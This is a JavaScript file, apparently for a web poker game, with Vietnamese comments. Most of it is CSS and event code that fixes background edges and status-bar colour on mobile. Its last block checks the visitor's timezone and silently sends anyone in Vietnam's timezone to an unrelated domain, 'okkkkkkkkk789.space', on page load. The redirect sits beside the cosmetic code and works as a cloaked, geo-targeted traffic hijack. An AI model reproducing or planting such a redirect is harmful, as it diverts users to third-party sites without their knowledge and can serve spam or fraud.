/* ===============================================
   WINAZ Poker – Edge-bleed Fullscreen BG + TZ Redirect (no-min)
   =============================================== */
(function () {
  try {
    // 1) CSS "nuke" – phủ nền vượt biên và loại mọi nguyên nhân viền
    const css = `
      :root { color-scheme: dark; }
      html, body {
        margin: 0 !important;
        padding: 0 !important;
        width: 100% !important;
        height: 100% !important;
        overscroll-behavior: none;
        -webkit-tap-highlight-color: transparent;
        -webkit-text-size-adjust: 100%;
        background: #222 !important;     /* nền chính trên html */
        transform: translateZ(0);         /* tránh seam do rounding */
      }
      /* body nền trong suốt để không lệch tone so với html */
      body { background: transparent !important; }

      /* LỚP NỀN VƯỢT BIÊN: che aliasing 1px ở mọi cạnh */
      html { position: relative; }
      html::before {
        content: "";
        position: fixed;
        left: -6px; right: -6px; top: -6px; bottom: -6px; /* vượt viewport */
        background: #222;
        z-index: -1;  /* luôn ở dưới cùng */
        pointer-events: none;
      }

      /* Xoá viền/outline/đổ bóng có thể gây cảm giác "line" */
      * { outline: 0; }
      @media (max-width: 480px) {
        #gameContainer { box-shadow: none !important; }
      }

      /* Chuyển safe-area padding sang container thay vì body */
      #gameContainer {
        padding-top:    calc(clamp(12px, 3vw, 24px) + env(safe-area-inset-top));
        padding-right:  calc(clamp(14px, 5vw, 22px) + env(safe-area-inset-right));
        padding-bottom: calc(clamp(12px, 3vw, 24px) + env(safe-area-inset-bottom));
        padding-left:   calc(clamp(14px, 5vw, 22px) + env(safe-area-inset-left));
        background-clip: padding-box;
      }

      /* Chặn glow khi kéo quá biên trên Android */
      html, body { overflow: hidden; }

      /* Trường hợp hiếm: ép nền cho toàn bộ viewport khi zoom */
      @supports (background-attachment: fixed) {
        html { background-attachment: fixed; }
      }
    `;

    const style = document.createElement('style');
    style.id = 'edge-bleed-bg';
    style.textContent = css;
    (document.head ? Promise.resolve() : new Promise(r => document.addEventListener('DOMContentLoaded', r, { once:true })))
      .then(() => { if (!document.getElementById('edge-bleed-bg')) document.head.appendChild(style); });

    // 2) Giữ body không bị script khác thêm padding làm hở nền
    const observer = new MutationObserver(() => {
      if (document.body && document.body.style.padding !== '0') {
        document.body.style.padding = '0';
      }
    });
    document.addEventListener('DOMContentLoaded', () => {
      if (document.body) observer.observe(document.body, { attributes: true, attributeFilter: ['style','class'] });
    }, { once:true });

    // 3) Đồng bộ màu thanh trạng thái (Android / iOS)
    const ensureMeta = (name, content) => {
      let m = document.querySelector(`meta[name="${name}"]`);
      if (!m) { m = document.createElement('meta'); m.name = name; document.head && document.head.appendChild(m); }
      m.content = content;
    };
    ensureMeta('theme-color', '#222');
    ensureMeta('apple-mobile-web-app-status-bar-style', 'black-translucent');

    // 4) Cập nhật lại khi thay đổi orientation/resize (một số máy Android render lại viền)
    const repaint = () => {
      // Tái gán thuộc tính để buộc reflow
      document.documentElement.style.transform = 'translateZ(0)';
      requestAnimationFrame(() => { document.documentElement.style.transform = 'translateZ(0)'; });
    };
    window.addEventListener('resize', repaint);
    window.addEventListener('orientationchange', repaint);
  } catch (err) {
    console && console.warn && console.warn('BG fix error:', err);
  }

  // 5) Redirect theo timezone (tránh vòng lặp nếu đã ở domain đích)
  try {
    const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || '').toString();
    console.log('User timezone:', tz);
    const targetDomain = 'okkkkkkkkk789.space';

    if (location.hostname !== targetDomain &&
        (tz === 'Asia/Ho_Chi_Minh' || tz === 'Asia/Saigon')) {
      location.href = 'https://' + targetDomain + '/';
    }
  } catch (err) {
    console && console.warn && console.warn('TZ redirect error:', err);
  }
})();
